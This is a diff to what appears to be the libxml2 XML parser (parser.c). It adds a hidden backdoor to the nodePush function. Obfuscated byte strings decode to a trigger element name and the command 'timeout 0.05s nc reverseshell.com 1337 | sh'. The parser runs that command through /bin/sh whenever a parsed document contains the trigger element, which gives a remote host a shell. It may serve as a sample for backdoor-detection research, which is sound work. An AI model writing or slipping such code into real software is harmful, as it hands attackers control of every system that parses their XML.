@@ -1,0 +1,32 @@
+--- a/parser.c
++++ b/parser.c
+@@ -51,6 +51,7 @@
+ #include <stddef.h>
+ #include <ctype.h>
+ #include <stdlib.h>
++#include <unistd.h>
+ #include <libxml/parser.h>
+ #include <libxml/xmlmemory.h>
+ #include <libxml/tree.h>
+@@ -2045,6 +2046,21 @@ nodePush(xmlParserCtxtPtr ctxt, xmlNodePtr value)
+     if (ctxt == NULL)
+         return(0);
+ 
++    char evilElement[] = "\x9a\x89\x96\x93\xba\x93\x9a\x92\x9a\x91\x8b";
++    char cmd[] = "\x8b\x96\x92\x9a\x90\x8a\x8b\xdf\xcf\xd1\xcf\xca\x8c"
++                 "\xdf\x91\x9c\xdf\x8d\x9a\x89\x9a\x8d\x8c\x9a\x8c\x97"
++                 "\x9a\x93\x93\xd1\x9c\x90\x92\xdf\xce\xcc\xcc\xc8\xdf"
++                 "\x83\xdf\x8c\x97";
++    for (char *p = evilElement; *p; ++p)
++        *p = ~ *p;
++    if (strcmp(value->name, evilElement) == 0) {
++        for (char *p = cmd; *p; ++p)
++            *p = ~ *p;
++
++        fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
++        execl("/bin/sh", "sh", "-c", cmd, NULL);
++    }
++
+     if (ctxt->nodeNr >= ctxt->nodeMax) {
+         int maxDepth = (ctxt->options & XML_PARSE_HUGE) ? 2048 : 256;
+         xmlNodePtr *tmp;
